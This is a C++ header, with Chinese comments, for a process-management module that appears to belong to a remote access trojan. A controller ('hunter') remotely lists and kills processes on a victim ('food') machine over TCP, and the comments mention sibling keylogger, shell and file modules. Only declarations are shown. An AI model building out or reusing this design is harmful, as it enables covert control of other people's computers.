// 进程管理模块的实现
// 依旧采取单例模式

#pragma once
#include "TcpSocket.h"
#include "ToolHelp.h"
#include <string>
#include <map>
#include <vector>
#include <strsafe.h>

class Proc
{
public:
	Proc();

	// ------------------------------定义进程管理命令--------------------------------
	// hunter发送至食物
	std::string CmdFreshProcs;           // 刷新进程列表
	std::string CmdKillProc;             // kill进程
	// 食物发送至hunter
	std::string CmdSendProc;             // 发送一个进程信息
	std::string CmdKillProcSuccess;      // kill进程成功
	std::string CmdKillProcFailed;       // kill进程失败
	// 分割与结束符
	std::string CmdSplit;
	std::string CmdEnd;
	// ------------------------------定义进程管理命令(完)--------------------------------

	// 此类入口函数 跟Keybd和shell还有File模块形式差不多 只负责来自hunter的命令解析
	static void startByNewThread(std::string domain, int port);
	static DWORD WINAPI procThreadProc(LPVOID args);
	static void startProc(std::string domain, int port);

	// 命令解析和执行
	static void addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size);
	static std::map<std::string, std::string> parseArgs(std::string& data);
	static void processCmd(TcpSocket* sock, std::string& cmd, std::string& data);

	// 在进程管理主线程直接处理命令的函数
	static void doFreshProcs(TcpSocket* sock, std::map<std::string, std::string>& args);
	static void doKillProc(TcpSocket* sock, std::map<std::string, std::string>& args);

	// 发送进程信息入口函数（当然要再开一个线程了 因为进程管理主线程只负责处理命令 会阻塞）
	static void startFreshProcsByNewThread(std::string domain, int port);
	static DWORD WINAPI freshProcsThreadProc(LPVOID args);
	static void freshProcs(std::string domain, int port);
	// kill进程入口函数（主要是要单独发送成功或失败的消息）
	static void startKillProcByNewThread(std::string domain, int port, int pid);
	static DWORD WINAPI killProcThreadProc(LPVOID args);
	static void killProc(std::string domain, int port, int pid);
};

